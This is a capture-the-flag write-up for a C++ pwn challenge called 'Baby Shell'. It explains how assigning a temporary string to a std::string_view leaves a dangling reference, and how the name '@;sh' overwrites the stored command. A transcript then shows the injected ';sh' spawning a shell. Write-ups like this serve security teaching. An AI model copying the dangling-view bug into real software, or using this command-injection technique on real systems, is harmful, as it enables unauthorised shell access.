# Baby Shell

* Round: 27 (2022/10)
* Category: Pwn
* Points: 50
* Solves: 17

## Description

I wrote a new shell in C++, but only premium users can actually use it :rooDevil:

Hint: The bug is in `string_view`. The source hides the bug a little bit, it might be helpful to look at the output of a decompiler like Ghidra or IDA

## Solution

`std::string` is a struct on stack and it will store the string data on stack when the data is small (SSO).  `std::string_view` is like a pointer that points to a `std::string`. So  `command = "#" + s` will assign a temporary string to a `string_view`, so it is like a dangling pointer.
And if you decompile it using ida, it is easy to see that two string concat uses same stack space, so executing `"@" + name` overrides the data that `command` points to.
```
> ./chall
What's your name? 1234
==== Menu ====
1. Change name
2. Status
3. Set command
4. Execute command
> 3
aaaa
==== Menu ====
1. Change name
2. Status
3. Set command
4. Execute command
> 1
What's your new name? ;sh
==== Menu ====
1. Change name
2. Status
3. Set command
4. Execute command
> 2
==== Status ====
Username: @;sh
Is premium: 0
==== Menu ====
1. Change name
2. Status
3. Set command
4. Execute command
> 4
Executing @;sh
sh: line 1: @: command not found
sh-5.1$ id
uid=1000(maple3142) gid=1000(maple3142) groups=1000(maple3142),998(wheel),1001(docker)
sh-5.1$
```
